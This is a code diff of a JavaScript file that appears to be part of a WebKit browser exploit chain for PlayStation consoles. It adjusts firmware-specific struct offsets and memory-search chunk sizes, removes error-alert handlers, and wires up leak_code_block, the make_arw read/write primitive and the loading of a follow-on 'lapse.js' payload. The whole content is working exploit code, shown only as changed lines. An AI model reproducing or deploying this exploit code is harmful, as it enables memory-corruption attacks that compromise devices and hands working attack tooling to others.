@@ -51,29 +51,8 @@ import {
 import * as config from './config.js';
 import * as off from './module/offset.js';
 
-addEventListener('unhandledrejection', event => {
-    const reason = event.reason;
-    alert(
-        'Unhandled rejection\n'
-        + `${reason}\n`
-        + `${reason.sourceURL}:${reason.line}:${reason.column}\n`
-        + `${reason.stack}`
-    );
-});
-
-addEventListener('error', event => {
-    const reason = event.error;
-    alert(
-        'Unhandled error\n'
-        + `${reason}\n`
-        + `${reason.sourceURL}:${reason.line}:${reason.column}\n`
-        + `${reason.stack}`
-    );
-    return true;
-});
-
 // check if we are running on a supported firmware version
-/*const [is_ps4, version] = (() => {
+const [is_ps4, version] = (() => {
     const value = config.target;
     const is_ps4 = (value & 0x10000) === 0;
     const version = value & 0xffff;
@@ -90,9 +69,9 @@ addEventListener('error', event => {
     }
 
     return [is_ps4, version];
-})();*/
+})();
 
-/*const ssv_len = (() => {
+const ssv_len = (() => {
     if (0x600 <= config.target && config.target < 0x650) {
         return 0x58;
     }
@@ -105,10 +84,9 @@ addEventListener('error', event => {
     if (0x650 <= config.target && config.target < 0x900) {
         return 0x48;
     }
-})();*/
+})();
 
 // these constants are expected to be divisible by 2
-const ssv_len = 0x50;
 const num_fsets = 0x180;
 const num_spaces = 0x40;
 const num_adjs = 8;
@@ -546,8 +524,7 @@ async function leak_code_block(reader, bt_size) {
         cache.push(part + `var idx = ${i};\nidx\`foo\`;`);
     }
 
-    //const chunkSize = (is_ps4 && version < 0x900) ? 128 * KB : 1 * MB;
-    const chunkSize = 128 * KB;
+    const chunkSize = (is_ps4 && version < 0x900) ? 128 * KB : 1 * MB;
     const smallPageSize = 4 * KB;
     const search_addr = align(rdr.m_data, chunkSize);
     log(`search addr: ${search_addr}`);
@@ -632,14 +609,14 @@ async function leak_code_block(reader, bt_size) {
 // address
 function make_ssv_data(ssv_buf, view, view_p, addr, size) {
     // sizeof JSC::ArrayBufferContents
-    /*const size_abc = (() => {
+    const size_abc = (() => {
         if (is_ps4) {
             return version >= 0x900 ? 0x18 : 0x20;
         } else {
             return version >= 0x300 ? 0x18 : 0x20;
         }
-    })();*/
-    const size_abc = 0x900 ? 0x18 : 0x20;
+    })();
+
     const data_len = 9;
     // sizeof WTF::Vector<T>
     const size_vector = 0x10;
@@ -879,9 +856,7 @@ async function main() {
     await make_arw(rdr, view2, pop);
 
     clear_log();
-    // path to your script that will use the exploit
     import('./lapse.js');
 }
-//main();
-setTimeout(main, 1500);
 setTimeout(StartTimer, 1500);
+setTimeout(main, 1500);
